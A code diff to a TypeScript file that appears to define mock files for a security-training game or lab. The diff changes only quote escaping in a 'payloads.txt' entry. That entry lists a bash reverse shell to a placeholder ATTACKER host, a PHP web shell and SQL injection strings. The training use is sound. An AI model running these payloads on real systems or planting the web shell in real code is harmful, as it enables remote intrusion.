@@ -18,7 +18,7 @@ const ROOM_FILE_MAP: Record<string, Record<string, RoomFiles[]>> = {
     ],
     room3: [
       { name: 'exploit-notes.md', content: '# Exploitation Fundamentals\n\n## Types of Exploits\n- Remote Code Execution (RCE)\n- SQL Injection\n- Cross-Site Scripting (XSS)\n- Buffer Overflow\n- Privilege Escalation\n\n## Framework\n1. Identify vulnerability\n2. Research existing exploits\n3. Craft payload\n4. Test in safe environment\n5. Execute with authorization' },
-      { name: 'payloads.txt', content: '# Common Payloads\n\n## Reverse Shell\nbash -i >& /dev/tcp/ATTACKER/PORT 0>&1\n\n## Web Shell\n<?php system($_GET[\"cmd\"]); ?>\n\n## SQL Injection\n\' OR 1=1--\nadmin\'--' },
+      { name: 'payloads.txt', content: '# Common Payloads\n\n## Reverse Shell\nbash -i >& /dev/tcp/ATTACKER/PORT 0>&1\n\n## Web Shell\n<?php system($_GET["cmd"]); ?>\n\n## SQL Injection\n\' OR 1=1--\nadmin\'--' },
     ],
     room4: [
       { name: 'report-template.md', content: '# Penetration Test Report\n\n## Executive Summary\n[High-level findings]\n\n## Scope\n[What was tested]\n\n## Methodology\n[How it was tested]\n\n## Findings\n### Critical\n### High\n### Medium\n### Low\n\n## Recommendations\n[Remediation steps]\n\n## Appendix\n[Tools used, raw data]' },
